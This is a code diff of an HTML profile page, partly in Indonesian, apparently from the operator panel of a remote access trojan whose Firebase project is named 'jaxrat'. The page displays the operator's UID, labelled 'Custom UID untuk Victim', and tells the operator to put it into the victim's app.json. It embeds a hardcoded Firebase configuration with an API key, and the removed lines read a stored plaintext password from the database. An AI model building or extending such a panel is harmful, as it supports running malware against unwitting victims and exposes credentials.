@@ -9,120 +9,104 @@
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: #f5f6fa; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .profile-card { background: white; border-radius: 10px; padding: 40px; max-width: 500px; width: 100%; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
+        h1 { margin-bottom: 30px; color: #2c3e50; }
+        .info { margin-bottom: 20px; padding: 15px; background: #f8f9fa; border-radius: 5px; }
+        .info label { display: block; color: #7f8c8d; font-size: 14px; margin-bottom: 5px; }
+        .info .value { font-family: monospace; font-size: 16px; color: #2c3e50; word-break: break-all; }
+        .btn-back, .btn-logout { display: inline-block; padding: 10px 20px; margin: 5px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; }
+        .btn-back { background: #3498db; color: white; }
+        .btn-logout { background: #e74c3c; color: white; }
+        .warning { background: #fff3cd; color: #856404; padding: 15px; border-radius: 5px; margin-top: 20px; }
+    </style>
 </head>
 <body>
-    <div class="profile-container">
-        <div class="profile-card">
-            <div class="profile-header">
-                <h1>👤 Profile Information</h1>
-                <a href="dashboard.html" class="btn-back">← Back to Dashboard</a>
-            </div>
-            
-            <div class="profile-content">
-                <div class="info-group">
-                    <label>Email Firebase:</label>
-                    <div class="info-value" id="profileEmail">
-                        <span>loading...</span>
-                        <button class="btn-copy" onclick="copyToClipboard('profileEmail')">📋 Copy</button>
-                    </div>
-                </div>
-                
-                <div class="info-group">
-                    <label>UID Firebase:</label>
-                    <div class="info-value" id="profileUid">
-                        <span>loading...</span>
-                        <button class="btn-copy" onclick="copyToClipboard('profileUid')">📋 Copy</button>
-                    </div>
-                </div>
-                
-                <div class="info-group">
-                    <label>Password:</label>
-                    <div class="info-value" id="profilePassword">
-                        <span>••••••••</span>
-                        <button class="btn-copy" onclick="copyPassword()">📋 Copy</button>
-                    </div>
-                </div>
-                
-                <div class="info-group">
-                    <label>Custom UID untuk Victim:</label>
-                    <div class="info-value">
-                        <input type="text" id="customUid" placeholder="Masukkan UID Firebase lo" value="">
-                        <button class="btn-save" onclick="saveCustomUid()">💾 Save</button>
-                    </div>
-                    <p class="hint">UID ini yang akan dimasukkan ke file app.json victim</p>
-                </div>
-                
-                <div class="warning-box">
-                    ⚠️ Jangan bagikan UID dan password ke siapapun!
-                </div>
+    <div class="profile-card">
+        <h1>👤 Profile Information</h1>
+        
+        <div id="profileContent">
+            <div class="info">
+                <label>Loading...</label>
+                <div class="value">Please wait...</div>
             </div>
         </div>
+        
+        <div style="margin-top: 30px; text-align: center;">
+            <a href="dashboard.html" class="btn-back">← Back to Dashboard</a>
+            <button id="logoutBtn" class="btn-logout">🚪 Logout</button>
+        </div>
+        
+        <div class="warning">
+            ⚠️ Jangan bagikan informasi ini ke siapapun!
+        </div>
     </div>
-    
-    <script src="js/firebase-config.js"></script>
+
     <script>
-        // Firebase Auth state
-        firebase.auth().onAuthStateChanged(async (user) => {
+        const firebaseConfig = {
+            apiKey: "AIzaSyDzA92c3IoyjhiFft3Ci6cpsvEJBXAzIfQ",
+            authDomain: "jaxrat-6813c.firebaseapp.com",
+            databaseURL: "https://jaxrat-6813c-default-rtdb.firebaseio.com",
+            projectId: "jaxrat-6813c",
+            storageBucket: "jaxrat-6813c.firebasestorage.app",
+            messagingSenderId: "750985295231",
+            appId: "1:750985295231:web:0679d4b998e52256e4d64a"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+
+        // Check auth
+        firebase.auth().onAuthStateChanged((user) => {
+            const profileContent = document.getElementById('profileContent');
+            
             if (!user) {
-                window.location.href = 'index.html';
+                // Cek session
+                const isLoggedIn = sessionStorage.getItem('isLoggedIn');
+                if (!isLoggedIn) {
+                    window.location.replace('index.html');
+                    return;
+                }
+                
+                // Tampilkan dari session
+                profileContent.innerHTML = `
+                    <div class="info">
+                        <label>Email (from session)</label>
+                        <div class="value">${sessionStorage.getItem('userEmail') || 'Unknown'}</div>
+                    </div>
+                    <div class="info">
+                        <label>UID (from session)</label>
+                        <div class="value">${sessionStorage.getItem('userUid') || 'Unknown'}</div>
+                    </div>
+                `;
                 return;
             }
             
-            // Tampilkan email
-            document.getElementById('profileEmail').innerHTML = `
-                <span>${user.email}</span>
-                <button class="btn-copy" onclick="copyText('${user.email}')">📋 Copy</button>
+            // Tampilkan dari Firebase
+            profileContent.innerHTML = `
+                <div class="info">
+                    <label>Email</label>
+                    <div class="value">${user.email}</div>
+                </div>
+                <div class="info">
+                    <label>UID Firebase</label>
+                    <div class="value">${user.uid}</div>
+                </div>
+                <div class="info">
+                    <label>Custom UID untuk Victim</label>
+                    <div class="value">${user.uid}</div>
+                    <small style="color: #7f8c8d;">Gunakan UID ini di app.json</small>
+                </div>
             `;
-            
-            // Tampilkan UID
-            document.getElementById('profileUid').innerHTML = `
-                <span>${user.uid}</span>
-                <button class="btn-copy" onclick="copyText('${user.uid}')">📋 Copy</button>
-            `;
-            
-            // Ambil password dari database (kalau disimpan)
-            const snapshot = await firebase.database().ref(`users/${user.uid}/password`).once('value');
-            const password = snapshot.val() || '••••••••';
-            
-            if (password !== '••••••••') {
-                document.getElementById('profilePassword').innerHTML = `
-                    <span>${password}</span>
-                    <button class="btn-copy" onclick="copyText('${password}')">📋 Copy</button>
-                `;
-            }
-            
-            // Cek custom UID dari localStorage atau database
-            const customUid = localStorage.getItem('customUid') || user.uid;
-            document.getElementById('customUid').value = customUid;
         });
-        
-        function copyText(text) {
-            navigator.clipboard.writeText(text);
-            alert('✅ Copied!');
-        }
-        
-        function copyToClipboard(elementId) {
-            const element = document.getElementById(elementId);
-            const text = element.querySelector('span').innerText;
-            navigator.clipboard.writeText(text);
-            alert('✅ Copied!');
-        }
-        
-        function copyPassword() {
-            const passwordSpan = document.querySelector('#profilePassword span');
-            if (passwordSpan.innerText !== '••••••••') {
-                navigator.clipboard.writeText(passwordSpan.innerText);
-                alert('✅ Password copied!');
-            } else {
-                alert('❌ Password hidden');
-            }
-        }
-        
-        function saveCustomUid() {
-            const customUid = document.getElementById('customUid').value;
-            localStorage.setItem('customUid', customUid);
-            alert('✅ Custom UID saved!');
-        }
+
+        // Logout
+        document.getElementById('logoutBtn').addEventListener('click', async () => {
+            await firebase.auth().signOut();
+            sessionStorage.clear();
+            window.location.replace('index.html');
+        });
     </script>
 </body>
 </html>
